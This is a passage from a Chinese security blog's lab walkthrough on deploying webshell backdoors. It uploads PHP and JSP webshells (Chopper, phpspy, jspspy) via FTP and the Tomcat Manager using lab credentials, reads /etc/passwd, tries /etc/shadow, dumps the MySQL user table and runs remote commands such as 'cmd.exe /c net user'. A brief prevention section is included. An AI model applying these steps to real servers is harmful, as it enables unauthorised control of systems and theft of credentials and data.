<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lcd c:\</span><br><span class="line">！<span class="keyword">dir</span></span><br><span class="line">put <span class="keyword">test</span>.php</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d437a67268.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d438636b77.png" /></p>
<h3
id="访问上传小马文件的网址菜刀链接并获取相关有用信息"><strong>2、访问上传小马文件的网址，菜刀链接并获取相关有用信息</strong></h3>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址，浏览器一片空白，也没有任何错误显示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4396a17b0.png" /></p>
<p>在 Chopper
工具的主界面中点击右键，选择“添加”菜单项后弹出“添加”对话框，在“地址”编辑框中输入以上
URL 地址，在右侧的小编辑框中输入密码“1234”，点击“添加”按钮后返回到
Chopper 主界面</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d43a278499.png" /></p>
<p>在 Chopper 主界面中双击刚添加的 URL
条目，如果设置正确的话，则会弹出如下“文件管理”的窗口</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d43c5e0536.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d43f17d826.png" /></p>
<p>双击“test.php”，载入窗口输入“/etc/passwd”，然后点击“载入”，然后可以查看到文件内容【用户名信息】。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d440938ead.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d452112b34.png" /></p>
<p>回到 Chopper 主界面，右击点击添加 URL 条目，选择“虚拟终端”菜单项</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4464a49ab.png" /></p>
<p>在弹出的命令执行窗口中，可以输入 Shell 指令后执行。
输入“id”命令来查看当前用户的权限。
输入“<code>uname -a</code>”来查看当前系统的内核版本信息。
输入“<code>/sbin/ifconfig</code>”来查看网络地址信息。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4470180ac.png" /></p>
<p>输入“<code>cat /etc/shadow</code>”命令来查看系统用户密码文档，会发现读取查看失败。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44784afd0.png" /></p>
<p>回到 Chopper 主界面，右击点击添加 URL
条目，选择“编辑”菜单项后弹出“编辑 Shell”对话框，
在“配置”编辑框中输入如下数据库连接字符串</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>127.0.0.1<span class="tag">&lt;<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>toor<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这其中定义了数据库连接类型为“MYSQL”，服务器地址为“127.0.0.1”（本地），数据库连接用户名为“root”，密码为“toor”。点击“编辑”按钮后返回到
Chopper 主界面。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44a3b9702.png" />
右击点击添加 URL
条目，选择“数据库管理”菜单项，这时候就会弹出“数据库管理”窗口，如下图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44b1248cd.png" /></p>
<p>双击左侧数据库列表中的“mysql”库，就能查看到该库中所有的表；双击“user”表，就能查看到该表中所有的列。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44cc988b2.png" />
这时候，“配置”右侧编辑框中的默认 SQL 语句为：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">DESC</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>其意思是查询“user”表内前 20 条记录。
点击右侧的“执行”按钮后如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44d9243c9.png" /></p>
<h3
id="利用小马获取的文件管理权限上传大马文件进行近一步的攻击"><strong>3、利用小马获取的文件管理权限上传大马文件，进行近一步的攻击</strong></h3>
<p>用记事本或者其他文本编辑软件打开“phpspy.php”这个 PHP Webshell
文件，找到如下这一行：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass = &#x27;e10adc<span class="number">3949</span>ba59abbe56e057f20f883e&#x27;; <span class="comment">//123456</span></span><br></pre></td></tr></table></figure>
<p>可自定义更改这个默认的管理登录密码“123456”，只是得首先计算密码的 MD5
散列值来替换原来的散列值内容。</p>
<p>回到 Chopper 主界面，右击点击添加 URL
条目，选择“文件管理”菜单项，然后在弹出的“文件管理”窗口中定位到“/var/www”目录，点击右键选择“上传文件”菜单项，选择操作机上的“phpspy.php”文件后将其上传到目标
Web 服务器的根目录中。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4619f0ccb.png" /></p>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址：</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//10.5.14.66/phpspy.php</span></span><br></pre></td></tr></table></figure>
<p>如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d466e01800.png" /></p>
<p>在登录密码输入框中输入我们前面设置的登录密码（默认为“123456”），然后点击右侧的
“Login”按钮即可成功进入 phpspy 的主控制界面。默认显示当前目录（即 Web
主目录）下的所有子目录和文件列表，如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d469971df7.png" /></p>
<p>在 Webshell 的主界面点击上方的“PHP
Variable”网页链接，我们就能查看目标
Web服务器特性（包括服务器时间、服务器域名、服务器 IP
地址、服务器操作系统、服务器操作系统文字编码、服务器解译引擎、Web
服务端口、PHP 运行方式、PHP 版本、是否支持运行于安全模式、服务器管理
员、本 Webshell 文件路径等），PHP
基本特性（显示错误信息、magic_quotes_gpc、允许最大上传 文件、允许使用
URL 打开文件等）、组件支持情况。如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d46b6bbca0.png" /></p>
<p>magic_quotes_gpc display_errors（显示错误信息）
register_globals（自动定义全局变量） allow_url_fopen（允许使用 URL
打开文件） Safe Mode（安全模式）</p>
<p>在 Webshell 的主界面点击上方的“Execute
Command”链接，然后在显示界面的编辑框中输入如下Shell 指令：</p>
<ul>
<li><code>id; uname -a; /sbin/ifconfig</code></li>
<li>之后点击“<code>Excute</code>”</li>
</ul>
<p>这是将若干条命令使用“;”（分号）来分隔，从而可以一次性执行多条语句</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d46d920d60.png" /></p>
<p>在 Webshell 的主界面点击上方的“File
Manager”网页链接，我们就能管理目标 Web
服务器上的文件和文件夹，包括下载、编辑、删除、改名、新建、上传等操作，也可利用“phpspy.php”提供的“View
Writable Directory”功能。</p>
<h1
id="win系统的jsp-webshell后门"><strong>Win系统的JSP-Webshell后门</strong></h1>
<h2 id="基本原理-2"><strong>1. 基本原理</strong></h2>
<p><strong>1、Win系统的JSP Webshell后门原理</strong></p>
<p>有一些服务器软件会使用到WAR，其中一些会提供用户上传WAR文件的接口。有些会允许用户使用一些外部源，利用这些接口上传jspspy.war木马文件，获取权限，最终控制目标主机。</p>
<h3 id="win系统的jsp-webshell后门危害"><strong>2、Win系统的JSP
Webshell后门危害</strong></h3>
<p>拿到了网站的WebShell，就可以修改网站的文件了！这样，网站将不再有秘密可言，比如下载文件，修改文件，删除文件等，将变得非常容易。拿到WebShell权限后，如果磁盘做了安全设置以及站点独立权限设置，则这个WebShell可能只能对当前站点有效，无法操作其他网站的程序。如果入侵者通过执行命令，提升网站的权限后，就可以发展到入侵服务器，进而创建管理用户，达到控制整台服务器的目的。</p>
<h3 id="win系统的jsp-webshell后门防范"><strong>3、Win系统的JSP
Webshell后门防范</strong></h3>
<p>当前最有效的解决办法，就是用软件查杀/入侵防护系统，快速对网站文件进行扫描，找出隐藏深处的网页木马并处理。
　　然后，设置好ftp服务器，防止上传木马文件；将文件系统设置存储权限；不要使用超级用户运行web服务；将可以极大提高服务器和网站的安全性。</p>
<h2 id="实验环境-2"><strong>2. 实验环境</strong></h2>
<ul>
<li>操作机：Windows</li>
<li>目标机：Ubuntu</li>
<li>实验工具：jspspy.jsp，jspspy.war</li>
</ul>
<p>jspspy.jsp是一款集成文件管理、数据库管理、命令执行等功能的木马文件。文件管理可以上传木马文件进行进一步提权，也可以下载有用的文件；数据库管理可以查询到数据库内容，获取有用信息；命令执行可以执行相关命令，添加管理用户等。</p>
<p>jspspy.war是一个war压缩包，里面有jspspy.jsp木马文件，是为了在web服务器能够上传war格式文件而做的一个压缩包文件。</p>
<h2 id="实验过程-2"><strong>3. 实验过程</strong></h2>
<h3
id="利用tomcat文件管理上传war的木马文件"><strong>1、利用Tomcat文件管理上传war的木马文件</strong></h3>
<p>用记事本或者其他文本编辑软件打开“jspspy.jsp”这个 JSP Webshell
文件，找到如下这一行：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">String</span> PW = <span class="string">&quot;123456&quot;</span>;    <span class="comment">//password</span></span><br></pre></td></tr></table></figure>
<p>可自定义更改这个默认的管理登录密码“123456”。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c5a500c9.png" /></p>
<p>首先把jspspy.wav压缩成raw格式，使用 Windows Rar
软件打开实验工具目录中的“jspspy.war”文件（先打开Tools.rar文件，返回上一级目录后，双击打开jspspy.war文件），然后将修改过密码的
JSP
Webshell文件更新到“jspspy.war”文件中去（先将war中的jspspy.jsp删除，然后点击命令-添加文件到文件夹中，选择要添加的文件jspspy.jsp，点击确定后添加完毕），如下图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4cc3e01c7.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c949ad74.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c9e6cd79.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4cad89f76.png" /></p>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4d56e30bc.png" /></p>
<p>点击左侧的“Tomcat
Manager”链接，在弹出的身份验证输入框中输入如下信息：</p>
<ul>
<li>用户名：<code>admin</code></li>
<li>密码：<code>@dm!n123</code></li>
</ul>
<p>登录成功之后进入如下 Tomcat 的管理页面</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4d7c6c9cc.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4d848f9de.png" /></p>
<p>点击“WAR file to
deploy”组合框部分的“选择文件”按钮，选择本地刚才定制的“jspspy.war”文件后点击“Deploy”来发布这个
Webshell 后门应用。 应用发布成功之后如图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4dc702da4.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4dd402bd7.png" /></p>
<h3
id="利用木马文件所具备的功能进行信息获取直至提权"><strong>2、利用木马文件所具备的功能进行信息获取直至提权</strong></h3>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址：<code>[http://10.5.14.64:8080/jspspy/jspspy.jsp](http://10.5.14.64:8080/jspspy/jspspy.jsp)</code>
　　注：文件大小写敏感，请注意。 如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4de85588d.png" /></p>
<p>在登录密码输入框中输入我们前面设置的登录密码（默认为“<code>123456</code>”），然后点击右侧的
“Login”按钮即可成功进入 jspspy 的主控制界面，默认显示当前目录（即 Web
主目录）下的所有子目录和文件列表，如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4e59697fa.png" /></p>
<p>点击上方的“File
Manager”链接，进入到“文件管理”功能界面。这时候就可以对目标 Web 服务器
上的文件和文件夹进行管理，包括下载、编辑和上传文件。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4e9b4a0f2.png" /></p>
<p>点击上方的“Execute
Command”链接，然后在下面的界面中就可以执行远程命令了。下面的“Execute
Shell”编辑框是调用“cmd.exe”来执行系统命令，格式为“cmd.exe
/c ”，如“<code>cmd.exe /c net user</code>”，点击“Submit”按钮提交执行。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4f02ebe2e.png" /></p>
<p>未完待续……</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Ghost
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/" title="远程控制和后门部署">https://z9m8r8.github.io/2022/10/17/远程控制和后门部署/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" rel="tag"><i class="fa fa-tag"></i> 远程控制</a>
              <a href="/tags/%E5%90%8E%E9%97%A8/" rel="tag"><i class="fa fa-tag"></i> 后门</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/09/27/grafana%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%90cve-2021-43798%E3%80%91/" rel="prev" title="Grafana目录遍历漏洞复现【CVE-2021-43798】">
                  <i class="fa fa-angle-left"></i> Grafana目录遍历漏洞复现【CVE-2021-43798】
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/11/29/docker%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/" rel="next" title="Docker的安装与配置">
                  Docker的安装与配置 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Ghost</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">222k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">13:28</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2022/10/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E5%90%8E%E9%97%A8%E9%83%A8%E7%BD%B2/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
